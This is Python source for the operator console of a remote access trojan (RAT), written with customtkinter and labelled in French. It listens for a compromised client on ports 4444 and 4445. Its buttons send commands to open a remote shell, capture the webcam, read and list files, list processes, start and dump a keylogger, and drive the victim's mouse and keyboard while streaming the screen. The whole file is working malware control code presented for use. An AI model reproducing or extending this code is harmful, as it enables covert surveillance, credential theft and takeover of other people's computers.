import socket
import threading
import io
from PIL import Image, ImageTk
import customtkinter as ctk
from protocol import send_data, receive_data, receive_base64

HOST = "0.0.0.0"
PORT = 4444
PORT_VIDEO = 4445

class RATGUI(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("RAT - Contrôle en direct")
        self.geometry("1000x700")
        ctk.set_appearance_mode("dark")
        ctk.set_default_color_theme("blue")

        self.client_socket = None
        self.client_address = None
        self.video_socket = None

        self.stream_w = 800
        self.stream_h = 500

        self.log_box = ctk.CTkTextbox(self, width=950, height=150)
        self.log_box.pack(pady=10)

        self.image_label = ctk.CTkLabel(self, text="")
        self.image_label.pack(pady=10)

        self.buttons_frame = ctk.CTkFrame(self)
        self.buttons_frame.pack(pady=10)

        self.add_button("Shell", self.send_shell)
        self.add_button("Webcam", self.send_webcam)
        self.add_button("Lire Fichier", self.send_read_file)
        self.add_button("Liste Fichiers", self.send_list_files)
        self.add_button("Processus", self.send_process)
        self.add_button("Démarrer Keylogger", self.keylogger_start)
        self.add_button("Logs Clavier", self.keylogger_dump)
        self.add_button("Écrire", self.type_text)
        self.add_button("Déconnecter", self.send_disconnect)

        self.image_label.bind("<Motion>", self.mouse_move)
        self.image_label.bind("<Button-1>", self.click_mouse)
        self.image_label.bind("<Key>", self.key_press)

        # Focus clavier actif dès clic dans la fenêtre
        self.bind("<Button-1>", self.focus_stream)

        threading.Thread(target=self.wait_for_connection, daemon=True).start()

    def focus_stream(self, event=None):
        self.image_label.focus_set()
        self.log("[*] Focus clavier activé.")

    def add_button(self, label, command):
        btn = ctk.CTkButton(self.buttons_frame, text=label, width=130, command=command)
        btn.pack(side="left", padx=5)

    def wait_for_connection(self):
        self.log("[*] En attente de connexions...")

        sock_cmd = socket.socket()
        sock_cmd.bind((HOST, PORT))
        sock_cmd.listen(1)
        self.client_socket, self.client_address = sock_cmd.accept()
        self.log(f"[+] Client commandes : {self.client_address}")

        sock_video = socket.socket()
        sock_video.bind((HOST, PORT_VIDEO))
        sock_video.listen(1)
        self.video_socket, _ = sock_video.accept()
        self.log("[+] Client vidéo connecté")

        self.receive_video_stream()

    def receive_video_stream(self):
        def stream():
            while True:
                try:
                    data = receive_base64(self.video_socket)
                    if not data or len(data) < 1000:
                        continue
                    img = Image.open(io.BytesIO(data)).resize((self.stream_w, self.stream_h))
                    photo = ImageTk.PhotoImage(img)
                    self.image_label.configure(image=photo)
                    self.image_label.image = photo
                except Exception as e:
                    self.log(f"[Erreur stream vidéo] {e}")
                    continue  # Continue à écouter
        threading.Thread(target=stream, daemon=True).start()

    def send_command(self, cmd):
        try:
            self.client_socket.send(cmd.encode())
        except:
            self.log("[-] Erreur d’envoi de commande")

    def log(self, text):
        self.log_box.insert("end", text + "\n")
        self.log_box.see("end")

    def mouse_move(self, event):
        x, y = event.x, event.y
        self.send_command(f"mouse_move {x} {y} {self.stream_w} {self.stream_h}")

    def click_mouse(self, event=None):
        self.send_command("click")

    def key_press(self, event):
        char = event.char
        if char:
            self.send_command(f"type {char}")
        elif event.keysym == "Return":
            self.send_command("type \n")
        elif event.keysym == "space":
            self.send_command("type  ")
        elif event.keysym == "BackSpace":
            self.send_command("type \b")

    def send_shell(self):
        self.send_command("shell")
        self.log(receive_data(self.client_socket).decode())

    def send_webcam(self):
        self.send_command("webcam")
        data = receive_base64(self.client_socket)
        try:
            img = Image.open(io.BytesIO(data)).resize((self.stream_w, self.stream_h))
            photo = ImageTk.PhotoImage(img)
            self.image_label.configure(image=photo)
            self.image_label.image = photo
            self.log("[Webcam reçue]")
        except Exception as e:
            self.log(f"[Erreur webcam] {e}")

    def send_read_file(self):
        self.send_command("readfile secret.txt")
        data = receive_base64(self.client_socket)
        try:
            content = data.decode(errors="ignore")
            self.log(content)
        except:
            self.log("[Erreur lecture]")

    def send_list_files(self):
        self.send_command("listfiles")
        self.log(receive_data(self.client_socket).decode())

    def send_process(self):
        self.send_command("process")
        self.log(receive_data(self.client_socket).decode())

    def keylogger_start(self):
        self.send_command("keylogger_start")
        self.log(receive_data(self.client_socket).decode())

    def keylogger_dump(self):
        self.send_command("keylogger_dump")
        self.log(receive_data(self.client_socket).decode())

    def type_text(self):
        self.send_command("type Bonjour depuis le serveur !")

    def send_disconnect(self):
        self.send_command("exit")
        self.client_socket.close()
        self.video_socket.close()
        self.log("[Déconnecté]")

if __name__ == "__main__":
    app = RATGUI()
    app.mainloop()